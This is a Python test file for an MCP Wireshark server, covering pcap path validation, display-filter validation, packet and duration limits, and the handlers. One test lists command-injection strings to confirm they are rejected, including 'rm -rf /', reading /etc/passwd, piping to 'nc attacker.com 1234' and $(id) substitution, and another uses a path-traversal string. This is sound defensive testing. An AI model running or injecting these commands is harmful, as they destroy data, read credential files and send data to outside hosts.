"""Tests for MCP server."""

from pathlib import Path

import pytest
from mcp.types import TextContent

from mcp_wireshark.server import (
    MAX_DURATION_SECONDS,
    MAX_PACKET_COUNT,
    handle_list_interfaces,
    handle_read_pcap,
    validate_display_filter,
    validate_file_path,
)


class TestValidation:
    def test_validate_file_path_valid_pcap(self, tmp_path: Path) -> None:
        """Test validation of valid pcap file path."""
        pcap_file = tmp_path / "test.pcap"
        pcap_file.touch()
        result = validate_file_path(str(pcap_file))
        assert result.suffix == ".pcap"
        result = validate_file_path(str(pcap_file))

    def test_validate_file_path_valid_pcapng(self, tmp_path: Path) -> None:
        """Test validation of valid pcapng file path."""
        pcap_file = tmp_path / "test.pcapng"
        pcap_file.touch()
        result = validate_file_path(str(pcap_file))
        assert result.suffix == ".pcapng"
        result = validate_file_path(str(pcap_file))

    def test_validate_file_path_invalid_extension(self, tmp_path: Path) -> None:
        """Test rejection of invalid file extension."""
        txt_file = tmp_path / "test.txt"
        txt_file.touch()
        with pytest.raises(ValueError, match="Invalid file extension"):
            validate_file_path(str(txt_file))
        with pytest.raises(ValueError, match="Invalid file extension"):
            validate_file_path(str(txt_file))

    def test_validate_file_path_traversal_attempt(self) -> None:
        """Test rejection of path traversal attempts."""
        with pytest.raises(ValueError, match="Path traversal"):
            validate_file_path("../../../etc/passwd.pcap")

    def test_validate_display_filter_valid(self) -> None:
        """Test validation of valid display filters."""
        valid_filters = [
            "tcp.port == 80",
            "http",
            "ip.addr == 192.168.1.1",
            "tcp.flags.syn == 1",
            'http.request.method == "GET"',
        ]
        for filter_expr in valid_filters:
            result = validate_display_filter(filter_expr)
            assert result == filter_expr

    def test_validate_display_filter_injection_attempts(self) -> None:
        """Test rejection of injection attempts in display filters."""
        dangerous_filters = [
            "tcp; rm -rf /",
            "http && cat /etc/passwd",
            "tcp | nc attacker.com 1234",
            "http`whoami`",
            "tcp$(id)",
        ]
        for filter_expr in dangerous_filters:
            with pytest.raises(ValueError, match="Invalid character"):
                validate_display_filter(filter_expr)

    def test_validate_display_filter_too_long(self) -> None:
        """Test rejection of overly long display filters."""
        long_filter = "a" * 1001
        with pytest.raises(ValueError, match="too long"):
            validate_display_filter(long_filter)

    def test_validate_display_filter_empty(self) -> None:
        """Test handling of empty display filter."""
        result = validate_display_filter("")
        assert result == ""


class TestSecurityConstants:
    """Tests for security constants."""

    def test_max_packet_count_reasonable(self) -> None:
        """Test that max packet count is set to a reasonable value."""
        assert MAX_PACKET_COUNT == 10000
        assert MAX_PACKET_COUNT > 0

    def test_max_duration_reasonable(self) -> None:
        """Test that max duration is set to a reasonable value."""
        assert MAX_DURATION_SECONDS == 300  # 5 minutes
        assert MAX_DURATION_SECONDS > 0


@pytest.mark.asyncio
async def test_list_interfaces() -> None:
    """Test listing network interfaces."""
    result = await handle_list_interfaces()

    assert isinstance(result, list)
    assert len(result) > 0
    assert isinstance(result[0], TextContent)
    assert result[0].type == "text"


@pytest.mark.asyncio
async def test_read_pcap_nonexistent() -> None:
    """Test reading from a nonexistent pcap file."""
    result = await handle_read_pcap({"file_path": "/nonexistent/file.pcap", "packet_count": 10})

    assert isinstance(result, list)
    assert len(result) > 0
    assert isinstance(result[0], TextContent)
    assert "not found" in result[0].text.lower() or "error" in result[0].text.lower()


@pytest.mark.asyncio
async def test_read_pcap_invalid_args() -> None:
    """Test read_pcap with invalid arguments."""
    result = await handle_read_pcap({"file_path": ""})

    assert isinstance(result, list)
    assert len(result) > 0
